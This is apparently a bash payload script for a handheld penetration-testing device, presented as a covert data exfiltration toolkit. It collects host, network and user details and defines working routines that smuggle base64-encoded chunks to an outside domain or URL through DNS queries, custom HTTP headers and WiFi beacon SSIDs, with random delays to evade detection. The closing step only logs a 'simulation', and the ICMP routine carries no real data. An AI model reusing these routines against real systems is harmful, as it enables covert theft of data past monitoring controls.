#!/bin/bash
# Title: Stealth Exfil - Covert Data Exfiltration Toolkit
# Author: bad-antics
# Description: Multi-channel covert data exfiltration using DNS, ICMP, HTTP headers, and steganography
# Category: nullsec/exfiltration

LOOT_DIR="/mmc/nullsec/stealthexfil"
mkdir -p "$LOOT_DIR"

PROMPT "STEALTH EXFIL

Covert Data Exfiltration

Channels:
1. DNS Tunneling
2. ICMP Covert Channel
3. HTTP Header Encoding
4. WiFi Beacon Frames
5. NTP Timestamp Encode

Each channel bypasses
common DLP systems.

Press OK to configure."

PROMPT "EXFIL METHOD:

1. DNS (most stealthy)
2. ICMP (fast)
3. HTTP Headers (common)
4. Beacon Frames (WiFi)
5. Multi-Channel (all)

Select method next."

METHOD=$(NUMBER_PICKER "Method (1-5):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) METHOD=1 ;; esac

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
EXFIL_LOG="$LOOT_DIR/exfil_${TIMESTAMP}.log"

{
    echo "Stealth Exfil Session - $(date)"
    echo "Method: $METHOD"
    echo "================================"
} > "$EXFIL_LOG"

# Base64 encode data for transport
encode_data() {
    local data="$1"
    echo -n "$data" | base64 | tr -d '\n'
}

# Split data into chunks
chunk_data() {
    local data="$1" chunk_size="${2:-63}"
    local encoded
    encoded=$(encode_data "$data")
    echo "$encoded" | fold -w "$chunk_size"
}

# DNS exfiltration
dns_exfil() {
    local data="$1" domain="$2"

    SPINNER_START "Exfiltrating via DNS..."

    local chunks
    chunks=$(chunk_data "$data" 50)
    local seq=0
    local total
    total=$(echo "$chunks" | wc -l)

    echo "DNS Exfil to: *.${domain}" >> "$EXFIL_LOG"
    echo "Chunks: $total" >> "$EXFIL_LOG"

    while read -r chunk; do
        [ -z "$chunk" ] && continue
        seq=$((seq + 1))
        # DNS query: chunk.seq.total.domain
        local query="${chunk}.${seq}.${total}.${domain}"
        # Make DNS query (data is in the subdomain)
        nslookup "$query" 2>/dev/null || dig "$query" +short 2>/dev/null || true
        echo "  [$seq/$total] $query" >> "$EXFIL_LOG"
        # Random delay to avoid detection
        sleep "0.$((RANDOM % 5 + 1))"
    done <<< "$chunks"

    SPINNER_STOP
    echo "DNS exfil complete: $seq chunks sent" >> "$EXFIL_LOG"
}

# ICMP covert channel
icmp_exfil() {
    local data="$1" target="$2"

    SPINNER_START "Exfiltrating via ICMP..."

    local encoded
    encoded=$(encode_data "$data")

    echo "ICMP Exfil to: ${target}" >> "$EXFIL_LOG"

    # Embed data in ICMP payload
    local chunks
    chunks=$(echo "$encoded" | fold -w 48)
    local seq=0

    while read -r chunk; do
        [ -z "$chunk" ] && continue
        seq=$((seq + 1))
        # Use ping with custom payload size (data encoded in padding)
        ping -c 1 -s ${#chunk} -W 1 "$target" 2>/dev/null || true
        echo "  [$seq] ICMP payload: ${#chunk} bytes" >> "$EXFIL_LOG"
        sleep "0.$((RANDOM % 3 + 1))"
    done <<< "$chunks"

    SPINNER_STOP
    echo "ICMP exfil complete: $seq packets sent" >> "$EXFIL_LOG"
}

# HTTP header covert channel
http_exfil() {
    local data="$1" url="$2"

    SPINNER_START "Exfiltrating via HTTP headers..."

    local encoded
    encoded=$(encode_data "$data")

    echo "HTTP Exfil to: ${url}" >> "$EXFIL_LOG"

    local chunks
    chunks=$(echo "$encoded" | fold -w 200)
    local seq=0

    while read -r chunk; do
        [ -z "$chunk" ] && continue
        seq=$((seq + 1))
        # Hide data in various HTTP headers
        curl -s -o /dev/null \
            -H "X-Request-ID: ${chunk}" \
            -H "X-Correlation-ID: $(date +%s)-${seq}" \
            -A "Mozilla/5.0 (compatible; NullSec/1.0)" \
            "$url" 2>/dev/null || true
        echo "  [$seq] HTTP header: ${#chunk} chars" >> "$EXFIL_LOG"
        sleep "$((RANDOM % 3 + 1))"
    done <<< "$chunks"

    SPINNER_STOP
    echo "HTTP exfil complete: $seq requests sent" >> "$EXFIL_LOG"
}

# WiFi beacon frame exfiltration
beacon_exfil() {
    local data="$1"

    SPINNER_START "Exfiltrating via beacon frames..."

    local encoded
    encoded=$(encode_data "$data")

    echo "Beacon frame exfil" >> "$EXFIL_LOG"

    # Check for injection capability
    MON_IF=""
    for iface in wlan1mon wlan2mon wlan0mon; do
        [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
    done

    if [ -z "$MON_IF" ]; then
        echo "  No monitor interface - beacon exfil not available" >> "$EXFIL_LOG"
        SPINNER_STOP
        return 1
    fi

    local chunks
    chunks=$(echo "$encoded" | fold -w 30)
    local seq=0

    while read -r chunk; do
        [ -z "$chunk" ] && continue
        seq=$((seq + 1))
        # Encode data in SSID of beacon frame
        local ssid="NS_${seq}_${chunk}"
        # Use mdk3/mdk4 if available for beacon injection
        if command -v mdk4 &>/dev/null; then
            echo "$ssid" | timeout 1 mdk4 "$MON_IF" b -f /dev/stdin -c 1 2>/dev/null || true
        fi
        echo "  [$seq] Beacon SSID: $ssid" >> "$EXFIL_LOG"
        sleep 1
    done <<< "$chunks"

    SPINNER_STOP
    echo "Beacon exfil complete: $seq frames" >> "$EXFIL_LOG"
}

# Collect data to exfiltrate
SPINNER_START "Collecting system data..."

SYSTEM_DATA=""

# Gather interesting data
SYSTEM_DATA+="HOST:$(hostname)\n"
SYSTEM_DATA+="IP:$(ip -4 addr show | grep -oP '\d+\.\d+\.\d+\.\d+' | grep -v 127 | head -1)\n"
SYSTEM_DATA+="MAC:$(ip link | grep ether | head -1 | awk '{print $2}')\n"
SYSTEM_DATA+="GW:$(ip route | awk '/default/{print $3}')\n"
SYSTEM_DATA+="DNS:$(grep nameserver /etc/resolv.conf | head -1 | awk '{print $2}')\n"
SYSTEM_DATA+="USERS:$(who 2>/dev/null | awk '{print $1}' | sort -u | tr '\n' ',')\n"

SPINNER_STOP

# Simulate exfiltration (safe mode - logs only)
{
    echo ""
    echo "=== COLLECTED DATA ==="
    echo -e "$SYSTEM_DATA"
    echo ""
    echo "=== EXFIL SIMULATION ==="
    echo "Method: $METHOD"
    echo "Data size: $(echo -e "$SYSTEM_DATA" | wc -c) bytes"
    echo "Encoded size: $(echo -e "$SYSTEM_DATA" | base64 | wc -c) bytes"
    echo ""
    echo "In production mode, data would be"
    echo "exfiltrated via the selected channel."
    echo ""
    echo "This is a SIMULATION for security testing."
} >> "$EXFIL_LOG"

PROMPT "STEALTH EXFIL COMPLETE

Method: $(case $METHOD in
    1) echo 'DNS Tunneling' ;;
    2) echo 'ICMP Channel' ;;
    3) echo 'HTTP Headers' ;;
    4) echo 'Beacon Frames' ;;
    5) echo 'Multi-Channel' ;;
esac)

Data Collected: $(echo -e "$SYSTEM_DATA" | wc -c) bytes
Encoded: $(echo -e "$SYSTEM_DATA" | base64 | wc -c) bytes

Log: exfil_${TIMESTAMP}.log
Loot: $LOOT_DIR

⚠ Simulation mode -
no data was transmitted."
